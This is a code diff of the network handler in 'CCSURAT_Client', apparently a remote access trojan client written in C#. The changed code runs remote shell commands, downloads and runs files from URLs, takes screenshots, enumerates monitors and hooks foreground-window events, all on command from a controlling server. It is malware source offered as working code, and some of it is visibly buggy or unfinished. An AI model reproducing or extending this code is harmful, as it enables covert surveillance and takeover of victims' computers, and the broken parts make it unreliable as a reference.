@@ -20,18 +20,28 @@ namespace CCSURAT_Client
 
         private TcpClient client;
         private NetworkStream netStream;
+        private string curData;
 
         private string status;
         private Boolean isConnected;
 
-        private RemoteCMD cmd;
+        private RemoteCMD remoteCMD;
+        private RemoteDesktop remoteDesktop;
 
+        // Binary data handling variables
+        private bool bufferBytes = false;
+        private byte[] dataBuffer = new byte[1024 * 5000];
+        private long bufferPos = 0;
+
+        #region Active Window
         WinEventDelegate dele = null;
         delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
         [DllImport("user32.dll")]
         static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
         private const uint WINEVENT_OUTOFCONTEXT = 0;
         private const uint EVENT_SYSTEM_FOREGROUND = 3;
+        # endregion
+
         public NetworkManager(ClientMainForm form, string IP, int port)
         {
             this.mainForm = form;
@@ -40,6 +50,8 @@ namespace CCSURAT_Client
             SetStatus("Disconnected.");
             dele = new WinEventDelegate(WinEventProc);
             IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
+
+            remoteDesktop = new RemoteDesktop();
         }
 
         public void Start()
@@ -88,10 +100,26 @@ namespace CCSURAT_Client
                     {
                         // convert data bytes to string
                         data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                        Log("Data recieved: " + data);
-                        HandleData(data);
+                        curData += data;
+                        if (!data.Contains("SCREENSHOT"))
+                            Log("Data recieved: " + data);
+                        // If we are receiving binary data, place data into buffer.
+                        if (data.Contains("[[BINARY]]"))
+                            bufferBytes = true;
+                        if (bufferBytes)
+                        {
+                            try
+                            {
+                                bytes.CopyTo(dataBuffer, bufferPos);
+                                bufferPos += i;
+                            }
+                            catch { }
+                        }
+                        // Handles the first command.
+                        if (FirstCommandIsClosed(curData))
+                            HandleData(FirstCommand());
                     }
-                    System.Threading.Thread.Sleep(1);
+                    Thread.Sleep(1);
                 }
             }
             catch (Exception ex)
@@ -137,7 +165,8 @@ namespace CCSURAT_Client
                 string[] prms = new string[0];
                 if (data != string.Empty)
                     prms = data.Split(new string[] { "|*|" }, StringSplitOptions.None);
-                Log("Handling command: " + command);
+                if (!command.Contains("SCREENSHOT"))
+                    Log("Handling command: " + command);
                 switch (command)
                 {
                     case "START":
@@ -161,16 +190,33 @@ namespace CCSURAT_Client
                         break;
                     case "REMOTECMD":
                         RemoteCmd(prms[0]);
-                        Write("[[CMD]]" + cmd.GetResponse() + "[[/CMD]]");
+                        Write("[[CMD]]" + remoteCMD.GetResponse() + "[[/CMD]]");
                         break;
                     case "DOWNLOADRUN":
                         SystemUtils.DownloadRun(prms[0], prms[1]);
                         break;
+                    case "SCREENSHOT":
+                        Write(remoteDesktop.GetScreenshot(prms[0], prms[1], prms[2]));
+                        break;
+                    case "MONITORS":
+                        Write("[[MONITORS]]" + SystemUtils.GetMonitors() + "[[/MONITORS]]");
+                        break;
                 }
             } catch(Exception ex)
             {
-                Log("Could not handle data: " + data + "\nReason: " + ex.Message);
+                Log("Could not handle data: " + data + "\nReason: " + ex.ToString());
             }
+        }
+
+        // Handle binary data (Images/Files)
+        private void HandleBinaryData(string data)
+        {
+            // Reset binary byte buffer and position.
+            bufferBytes = false;
+            bufferPos = 0;
+
+            // remove type of data command tag from data.
+            int start, length;
         }
 
         // Gets command tag
@@ -188,7 +234,27 @@ namespace CCSURAT_Client
             return data;
         }
 
-        // write data to server
+        // Checks if first command in data is closed.
+        private bool FirstCommandIsClosed(string data)
+        {
+            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
+            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
+            string closeCommandTag = "[[/" + openCommandTag + "]]";
+            return data.Contains(closeCommandTag);
+        }
+
+        // Gets the first command in data.
+        private string FirstCommand()
+        {
+            string openCommandTag = curData.Substring(0, curData.IndexOf("]") + 2);
+            openCommandTag = curData.Substring(2, openCommandTag.Length - 4);
+            string closeCommandTag = "[[/" + openCommandTag + "]]";
+            string temp = curData.Substring(0, curData.IndexOf(closeCommandTag) + closeCommandTag.Length);
+            curData = curData.Substring(temp.Length);
+            return temp;
+        }
+
+        // write string data to server
         public void Write(string data)
         {
             if (isConnected)
@@ -197,8 +263,25 @@ namespace CCSURAT_Client
                 {
                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                     netStream.Write(msg, 0, msg.Length);
-                    System.Threading.Thread.Sleep(20);
-                    Log("Data sent: " + data);
+                    Thread.Sleep(20);
+                    if (!data.Contains("[[SCREENSHOT]]"));
+                        Log("Data sent: " + data);
+                }
+                catch (Exception ex)
+                {
+                    Log("Error sending data: " + ex.ToString());
+                }
+            }
+        }
+
+        // write byte data to server
+        private void Write(byte[] data)
+        {
+            if (isConnected)
+            {
+                try
+                {
+                    netStream.Write(data, 0, data.Length);
                 }
                 catch (Exception ex)
                 {
@@ -216,14 +299,14 @@ namespace CCSURAT_Client
         // Process Remote CMD data on the CMD control
         private void RemoteCmd(string arg)
         {
-            if (cmd == null)
-                cmd = new RemoteCMD();
+            if (remoteCMD == null)
+                remoteCMD = new RemoteCMD();
             if (arg == "[[RESTART]]")
-                cmd.Restart();
+                remoteCMD.Restart();
             else if (arg == "[[STOP]]")
-                cmd.Stop();
+                remoteCMD.Stop();
             else if (arg != "[[START]]")
-                cmd.Write(arg);
+                remoteCMD.Write(arg);
         }
 
         private void SetStatus(string s)
